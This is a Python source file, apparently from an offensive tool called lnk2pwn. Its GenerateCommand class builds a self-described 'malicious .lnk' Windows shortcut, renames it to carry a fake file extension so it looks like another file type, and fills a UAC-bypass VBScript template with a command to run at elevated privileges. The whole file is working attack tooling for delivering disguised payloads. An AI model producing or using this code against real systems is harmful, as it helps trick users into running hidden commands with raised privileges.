# MIT License
#
# Copyright (c) 2018 tommelo
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE

# -*- coding: utf-8; mode: python; py-indent-offset: 4; indent-tabs-mode: nil -*-
# vim: fileencoding=utf-8 tabstop=4 expandtab shiftwidth=4
# pylint: disable=C0103,C0301,W1202,W0212

import os
import json
import shutil
import subprocess
from utils.log import Log
from command import Command

class GenerateCommand(Command):
    """
    The GenerateCommand class.

    This class handles the option -g, --generate
    to generate a malicious .lnk file    
    """

    def __init__(self):
        Command.__init__(self, self.__generate)
        
        self.wine = "wine"
        self.mklnk = "".join([os.getcwd(), "/bin/mklnk.exe"])
        self.uac_bypass_src = "".join([os.getcwd(), "/vbs/uac_bypass.vbs"])
        self.workspace = "/tmp/lnk2pwn/"
        self.default_lnk_file = "lnk2pwn.lnk"
        self.window_styles = ("NORMAL", "MAXIMIZED", "MINIMIZED")

    def __create_lnk(self, lnk_config, output_file):
        """
        Creates a .lnk file based on the given config.

        Parameters
        ----------
        link_config: dict
            The .lnk attributes configuration
        output_file: str
            The output file to be created

        Returns
        ----------
        sub_output: str
            The subprocess output
        """

        arguments = []

        arguments.append(self.wine)
        arguments.append(self.mklnk)
        arguments.append("-t")
        arguments.append(lnk_config["target_path"])
        arguments.append("-o")
        arguments.append(output_file)
        arguments.append("--window-style")
        arguments.append(lnk_config["window_style"])
        
        if lnk_config["working_dir"]:            
            arguments.append("-w")
            arguments.append(lnk_config["working_dir"])  

        if lnk_config["arguments"]:            
            arguments.append("-a")
            arguments.append(lnk_config["arguments"])                
        
        if lnk_config["icon_path"]:            
            arguments.append("-i")
            arguments.append(lnk_config["icon_path"])
        
        if lnk_config["icon_index"]:            
            arguments.append("--icon-index")
            arguments.append(lnk_config["icon_index"])
        
        if lnk_config["description"]:
            arguments.append("-d")
            arguments.append(lnk_config["description"])

        return subprocess.check_output(arguments)

    def __fake_ext(self, lnk_file, prefix, ext):
        """
        Renames the file with a fake extension.
        
        Parameters
        ----------
        lnk_file: str
            The .lnk to be renamed
        prefix: str
            The file name prefix
        ext: str
            The fake extension

        Returns
        ----------
        out_file: str
            The renamed file name
        """

        fake_ext_file = prefix + ext + ".lnk"
        out_file = "".join([self.workspace, fake_ext_file])
        os.rename(lnk_file, out_file)

        return out_file

    def __generate_uac_bypass(self, cmd, out_file):
        """
        Generates a VBScript to bypass UAC.
        
        Parameters
        ----------
        cmd: str
            The command to be executed with elevated privileges
        out_file: str
            The VBScript file name to be saved
        """

        src_code = None        
        with open(self.uac_bypass_src, "r") as src:
            src_code = src.read()

        exploit_src = src_code % (cmd)

        with open(out_file, 'w') as src:
            src.write(exploit_src)

    def __generate(self, args, config=None):
        """
        Generates a malicious .lnk file.
        
        Parameters
        ----------
        args: Namespace
            The cli arguments
        config: dict
            The shortcut config attributes
        """

        Log.info("Setting up the workspace")
        if not os.path.exists(self.workspace):
            os.makedirs(self.workspace)

        Log.info("Creating the output folder")
        if not os.path.exists(args.output_path):
            os.makedirs(args.output_path)

        Log.info("Generating the shortcut")
        lnk_config = config["json_config"]["shortcut"]
        
        tmp_lnk = "".join([self.workspace, self.default_lnk_file])
        self.__create_lnk(lnk_config, tmp_lnk)
        
        Log.info("Renaming .lnk to a fake extension: {}".format(lnk_config["fake_extension"]))
        tmp_lnk_rtlo = self.__fake_ext(
            tmp_lnk, 
            lnk_config["file_name_prefix"], 
            lnk_config["fake_extension"])
        
        Log.info("Generating the UAC bypass VBScript")
        uac_config = config["json_config"]["elevated_uac"]
        tmp_vb_script = "".join([self.workspace, uac_config["file_name"]])
        self.__generate_uac_bypass(uac_config["cmd"], tmp_vb_script)

        Log.info("Moving files to the output folder")
        vb_script = "".join([os.path.join(args.output_path, ''), uac_config["file_name"]])
        lnk_file = "".join([os.path.join(args.output_path, ''), os.path.basename(tmp_lnk_rtlo)])

        os.rename(tmp_lnk_rtlo, lnk_file)
        os.rename(tmp_vb_script, vb_script)
        
        Log.info("Generated .lnk file: {}".format(lnk_file))
        Log.info("Generated .vbs file: {}".format(vb_script))

        Log.info("Cleaning up workspace folder")
        shutil.rmtree(self.workspace)

        Log.info("Done")

    def execute(self, args):
        """
        The abstract execute method implementation.

        Validates and executes the given cli arguments.

        Parameters
        ----------
        args: Namespace
            The cli arguments
        """

        if not args.json_config and not args.config_file:
            raise ValueError("No config file given")
        
        if not args.output_path:
            raise ValueError("No output path given")

        if not os.access(os.path.dirname(args.output_path), os.W_OK):
            raise ValueError("Can't write to {}".format(args.output_path))

        text_config = args.json_config or args.config_file.read()
        json_config = json.loads(text_config)

        shortcut_config = json_config["shortcut"]
        if not shortcut_config["target_path"]:
            raise ValueError("No target path given in config file")

        total_cmd = len(shortcut_config["target_path"]) + len(shortcut_config["arguments"])
        if total_cmd > 259:
            raise ValueError("Target path + arguments cannot exceed 259 characters")

        window_style = shortcut_config["window_style"] or "NORMAL"
        window_style = window_style.upper()

        if not window_style in self.window_styles:
            raise ValueError("Invalid window style option: {}".format(window_style))

        json_config["shortcut"]["window_style"] = window_style
        
        self.delegate(args, json_config=json_config)